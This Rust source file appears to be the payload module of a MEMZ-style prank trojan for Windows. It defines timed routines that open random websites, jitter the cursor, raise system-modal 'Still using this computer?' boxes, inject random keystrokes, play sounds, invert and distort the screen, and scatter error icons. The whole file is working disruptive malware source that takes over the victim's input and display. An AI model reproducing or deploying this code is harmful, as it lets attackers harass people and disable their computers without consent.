use std::{
    mem::size_of,
    thread::{self, sleep},
    time::Duration,
};

use super::{
    callback::{enum_child_proc, msg_box_hook},
    define::{Payload, PAYLOAD},
};

#[cfg(feature = "DEBUG_MODE")]
use crate::utils::log::*;
#[cfg(feature = "DEBUG_MODE")]
use windows::Win32::Foundation::GetLastError;

use crate::{
    convert_str::ToPCSTRWrapper,
    data::{
        msg::{n_sounds, SOUNDS},
        sites::{N_SITES, SITES},
    },
    wrap_windows_api::{
        wrap_get_current_thread_id, wrap_get_system_metrics, wrap_load_icon_a, wrap_messagebox_a,
        wrap_set_windows_hook_ex_a, wrap_shell_execute_w, wrap_unhook_windows_hook_ex, WinError,
    },
};
use windows::{
    core::{PCSTR, PCWSTR},
    Win32::{
        Foundation::{HMODULE, HWND, LPARAM, POINT, RECT},
        Graphics::Gdi::{BitBlt, GetWindowDC, ReleaseDC, StretchBlt, NOTSRCCOPY, SRCCOPY},
        Media::Audio::{PlaySoundA, SND_ASYNC},
        System::LibraryLoader::GetModuleHandleA,
        UI::{
            Input::KeyboardAndMouse::{SendInput, INPUT, INPUT_KEYBOARD, VIRTUAL_KEY},
            WindowsAndMessaging::{
                DrawIcon, EnumChildWindows, GetCursorPos, GetDesktopWindow, GetWindowRect,
                SetCursorPos, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL, SM_CXICON, SM_CXSCREEN,
                SM_CYICON, SM_CYSCREEN, SW_SHOWDEFAULT, WH_CBT,
            },
        },
    },
};

pub const PAYLOADS: &[PAYLOAD] = &[
    PAYLOAD {
        payload_function: payload_execute,
        delay: 30000,
    },
    PAYLOAD {
        payload_function: payload_cursor,
        delay: 30000,
    },
    PAYLOAD {
        payload_function: payload_message_box,
        delay: 20000,
    },
    PAYLOAD {
        payload_function: payload_keyboard,
        delay: 20000,
    },
    PAYLOAD {
        payload_function: payload_sound,
        delay: 50000,
    },
    PAYLOAD {
        payload_function: payload_blink,
        delay: 30000,
    },
    PAYLOAD {
        payload_function: payload_draw_errors,
        delay: 10000,
    },
    PAYLOAD {
        payload_function: payload_change_text,
        delay: 40000,
    },
    PAYLOAD {
        payload_function: payload_pip,
        delay: 60000,
    },
    PAYLOAD {
        payload_function: payload_puzzle,
        delay: 15000,
    },
];

pub const N_PAYLOADS: usize = PAYLOADS.len();

pub fn payload_thread(parameter: &Payload) {
    let mut delay = 0;
    let mut times = 0;
    let mut runtime = 0;

    let payload = parameter;

    loop {
        if delay == 0 {
            delay = (payload.payload_function)(times, runtime);
            times += 1;
        }
        delay -= 1;
        sleep(Duration::from_millis(10));
        runtime += 1;
    }
}

fn payload_execute(times: i32, _runtime: i32) -> i32 {
    wrap_shell_execute_w(
        HWND::default(),
        "open",
        SITES[rand::random::<usize>() % N_SITES],
        PCWSTR::null(),
        PCWSTR::null(),
        SW_SHOWDEFAULT,
    )
    .expect("Failed ShellExecuteW()");

    (1500.0 / (times as f32 / 15.0 + 1.0) + 100.0 + (rand::random::<f32>() % 200.0)) as i32
}

fn payload_cursor(_times: i32, runtime: i32) -> i32 {
    let mut cursor: POINT = Default::default();
    unsafe {
        GetCursorPos(&mut cursor);
        SetCursorPos(
            cursor.x
                + (rand::random::<i32>() % 3 - 1) * (rand::random::<i32>() % (runtime / 2200 + 2)),
            cursor.y
                + (rand::random::<i32>() % 3 - 1) * (rand::random::<i32>() % (runtime / 2200 + 2)),
        );
    }
    2
}

fn payload_message_box(times: i32, _runtime: i32) -> i32 {
    let message_box_thread = thread::spawn(move || -> Result<(), WinError> {
        let hook = wrap_set_windows_hook_ex_a(
            WH_CBT,
            Some(msg_box_hook),
            HMODULE::default(),
            wrap_get_current_thread_id(),
        )?;
        wrap_messagebox_a(
            HWND::default(),
            "Still using this computer?",
            "lol",
            MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING,
        )?;
        wrap_unhook_windows_hook_ex(hook)?;

        Ok(())
    });
    message_box_thread.join().unwrap().unwrap();

    (2000.0 / (times as f32 / 8.0 + 1.0) + 20.0 + (rand::random::<f32>() % 30.0)) as i32
}

fn payload_keyboard(_: i32, _: i32) -> i32 {
    let mut input: INPUT = INPUT {
        ..Default::default()
    };

    input.r#type = INPUT_KEYBOARD;
    input.Anonymous.ki.wVk = VIRTUAL_KEY((rand::random::<u16>() % (0x5a - 0x30)) + 0x30);

    unsafe {
        match SendInput(&[input], size_of::<INPUT>() as i32) {
            0 => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                LogLocation::ALL,
                &format!(
                        "Failed SendInput()\nError: Input was already blocked by another thread\nGetLastError: {:?}", 
                        GetLastError()
                    )
                );
                None
            }
            v => Some(v),
        };
    }
    300 + (rand::random::<i32>() % 40)
}

fn payload_sound(_times: i32, _runtime: i32) -> i32 {
    unsafe {
        let hmod = match GetModuleHandleA(PCSTR::null()) {
            Ok(v) => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::INFO,
                    LogLocation::ALL,
                    "SUCCESS GetModuleHandleA()",
                );
                Some(v)
            }
            #[allow(unused_variables)]
            Err(e) => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                    LogLocation::ALL,
                    &format!(
                        "Failed GetModuleHandleA()\nError: {e}\nGetLastError: {:?}",
                        GetLastError()
                    ),
                );
                None
            }
        };

        match PlaySoundA(
            *SOUNDS[rand::random::<usize>() % n_sounds()].to_pcstr(),
            hmod.unwrap(),
            SND_ASYNC,
        )
        .as_bool()
        {
            true => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(LogType::INFO, LogLocation::ALL, "SUCCESS PlaySoundA()");
            }
            false => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                LogLocation::ALL,
                &format!(
                        "Failed PlaySoundA()\nError: function can find neither the system default entry nor the default sound\nGetLastError: {:?}", 
                        GetLastError()
                    )
                );
            }
        }
    }
    20 + (rand::random::<i32>() % 20)
}

fn payload_blink(_times: i32, _runtime: i32) -> i32 {
    unsafe {
        let hwnd = GetDesktopWindow();
        let hdc = GetWindowDC(hwnd);
        let mut rekt: RECT = Default::default();
        match GetWindowRect(hwnd, &mut rekt).as_bool() {
            true => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(LogType::INFO, LogLocation::ALL, "SUCCESS GetWindowRect()");
            }
            false => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                    LogLocation::ALL,
                    &format!("Failed GetWindowRect()\nGetLastError: {:?}", GetLastError()),
                );
            }
        };
        match BitBlt(
            hdc,
            0,
            0,
            rekt.right - rekt.left,
            rekt.bottom - rekt.top,
            hdc,
            0,
            0,
            NOTSRCCOPY,
        )
        .as_bool()
        {
            true => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(LogType::INFO, LogLocation::ALL, "SUCCESS BitBlt()");
            }
            false => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                    LogLocation::ALL,
                    &format!("Failed BitBlt()\nGetLastError: {:?}", GetLastError()),
                );
            }
        }
    }
    100
}

fn payload_draw_errors(times: i32, _runtime: i32) -> i32 {
    let (ix, iy) = (
        wrap_get_system_metrics(SM_CXICON).expect("Failed GetSystemMetrics"),
        wrap_get_system_metrics(SM_CYICON).expect("Failed GetSystemMetrics"),
    );

    let (scrw, scrh) = (
        wrap_get_system_metrics(SM_CXSCREEN).expect("Failed GetSystemMetrics"),
        wrap_get_system_metrics(SM_CYSCREEN).expect("Failed GetSystemMetrics"),
    );

    unsafe {
        let hwnd = GetDesktopWindow();
        let hdc = GetWindowDC(hwnd);

        let mut cursor: POINT = Default::default();
        GetCursorPos(&mut cursor);

        let load_icon = wrap_load_icon_a(HMODULE(0), "IDI_ERROR").unwrap_or_default();

        DrawIcon(hdc, cursor.x - ix, cursor.y - iy, load_icon);

        if rand::random::<i32>() % (10.0 / (times as f32 / 500.0 + 1.0)) as i32 == 0 {
            DrawIcon(
                hdc,
                rand::random::<i32>() % scrw,
                rand::random::<i32>() % scrh,
                wrap_load_icon_a(HMODULE(0), "IDI_WARNING").unwrap_or_default(),
            );
        }
        if ReleaseDC(hwnd, hdc) == 0 {
            #[cfg(feature = "DEBUG_MODE")]
            write_log(LogType::ERROR, LogLocation::ALL, "Failed ReleaseDC()\n");
        } else {
            #[cfg(feature = "DEBUG_MODE")]
            write_log(LogType::INFO, LogLocation::ALL, "SUCCESS ReleaseDC()");
        }
    }
    2
}

fn payload_change_text(_times: i32, _runtime: i32) -> i32 {
    unsafe {
        EnumChildWindows(GetDesktopWindow(), Some(enum_child_proc), LPARAM::default());
    }
    50
}

fn payload_pip(times: i32, _runtime: i32) -> i32 {
    unsafe {
        let hwnd = GetDesktopWindow();
        let hdc = GetWindowDC(hwnd);
        let mut rekt: RECT = Default::default();
        GetWindowRect(hwnd, &mut rekt);
        if !StretchBlt(
            hdc,
            50,
            50,
            rekt.right - 100,
            rekt.bottom - 100,
            hdc,
            0,
            0,
            rekt.right,
            rekt.bottom,
            SRCCOPY,
        )
        .as_bool()
        {
            #[cfg(feature = "DEBUG_MODE")]
            write_log(LogType::ERROR, LogLocation::ALL, "Failed StretchBlt()\n");
        } else {
            #[cfg(feature = "DEBUG_MODE")]
            write_log(LogType::INFO, LogLocation::ALL, "SUCCESS StretchBlt()");
        }
        if ReleaseDC(hwnd, hdc) == 0 {
            #[cfg(feature = "DEBUG_MODE")]
            write_log(LogType::ERROR, LogLocation::ALL, "Failed ReleaseDC()\n");
        } else {
            #[cfg(feature = "DEBUG_MODE")]
            write_log(LogType::INFO, LogLocation::ALL, "SUCCESS ReleaseDC()");
        }
    }
    (200.0 / (times as f32 / 5.0 + 1.0) + 4.0) as i32
}

fn payload_puzzle(times: i32, _runtime: i32) -> i32 {
    unsafe {
        let hwnd = GetDesktopWindow();
        let hdc = GetWindowDC(hwnd);
        let mut rekt: RECT = Default::default();
        match GetWindowRect(hwnd, &mut rekt).as_bool() {
            true => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(LogType::INFO, LogLocation::ALL, "SUCCESS GetWindowRect()");
            }
            false => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                    LogLocation::ALL,
                    &format!("Failed GetWindowRect()\nGetLastError: {:?}", GetLastError()),
                );
            }
        };

        let x1 = rand::random::<i32>() % (rekt.right - 100);
        let y1 = rand::random::<i32>() % (rekt.left - 100);
        let x2 = rand::random::<i32>() % (rekt.right - 100);
        let y2 = rand::random::<i32>() % (rekt.left - 100);
        let width = rand::random::<i32>() % 600;
        let height = rand::random::<i32>() % 600;

        match BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY).as_bool() {
            true => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(LogType::INFO, LogLocation::ALL, "SUCCESS BitBlt()");
            }
            false => {
                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                    LogLocation::ALL,
                    &format!("Failed BitBlt()\nGetLastError: {:?}", GetLastError()),
                );
            }
        }

        if ReleaseDC(hwnd, hdc) == 0 {
            #[cfg(feature = "DEBUG_MODE")]
            write_log(LogType::ERROR, LogLocation::ALL, "Failed ReleaseDC()\n");
        } else {
            #[cfg(feature = "DEBUG_MODE")]
            write_log(LogType::INFO, LogLocation::ALL, "SUCCESS ReleaseDC()");
        }
    }

    (200.0 / (times as f32 / 5.0 + 1.0) + 3.0) as i32
}
